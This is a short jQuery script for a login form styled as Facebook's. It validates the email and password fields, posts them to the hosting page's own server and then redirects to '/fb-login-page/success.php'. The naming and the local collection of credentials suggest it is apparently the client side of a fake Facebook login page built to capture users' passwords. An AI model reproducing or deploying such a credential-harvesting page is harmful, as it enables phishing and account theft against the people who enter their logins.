$(document).ready(function () {
    $(document).on('click', ".facebook__form .form__btn", function () {

        var email = $(".facebook__form .form__mail").val(),
            password = $(".facebook__form .form__password").val(),
            error = false;
        if (email == '') {
            console.log("email")
            $(".facebook__form .email_error_msg").html("empty email");
            error = true;
        }
        if (password == '') {
            console.log("password")
            $(".facebook__form .password_error_msg").html("empty password");
            error = true;
        }

        if (!error) {
            $(".facebook__form .email_error_msg").html("");
            $(".facebook__form .password_error_msg").html("");
            $.post("",
                {
                    formSubmit: true,
                    email: email,
                    password: password
                },
                function (data, status) {
                    if (status == 'success') {
                        if (data == 'ok') {
                            window.location.replace('/fb-login-page/success.php')
                        } else {
                            $('.facebook__form .server__errors').html(data);
                        }
                    } else {
                        alert("something went wrong");
                    }
                });
        }
    });
});
